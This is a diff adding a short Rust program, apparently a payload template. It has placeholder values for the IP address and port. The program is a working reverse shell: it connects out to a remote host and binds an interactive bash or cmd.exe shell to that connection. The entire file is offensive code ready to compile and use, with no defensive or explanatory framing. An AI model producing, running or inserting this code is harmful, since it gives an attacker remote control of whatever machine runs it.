@@ -1,0 +1,25 @@
+use std::net::TcpStream;
+use std::process::{Command, Stdio};
+use std::env;
+
+fn main() {
+    if let Ok(stream) = TcpStream::connect("__IPADDR__:__PORT__") {
+        let shell = if cfg!(target_os = "windows") {
+            "cmd.exe"
+        } else {
+            "/bin/bash"
+        };
+
+        let _ = Command::new(shell)
+            .arg("-i")
+            .stdin(Stdio::from(stream.try_clone().expect("Failed to clone stream")))
+            .stdout(Stdio::from(stream.try_clone().expect("Failed to clone stream")))
+            .stderr(Stdio::from(stream))
+            .spawn()
+            .expect("Failed to spawn shell")
+            .wait();
+    } else {
+        eprintln!("[-] Could not connect to __IPADDR__:__PORT__");
+    }
+}
+
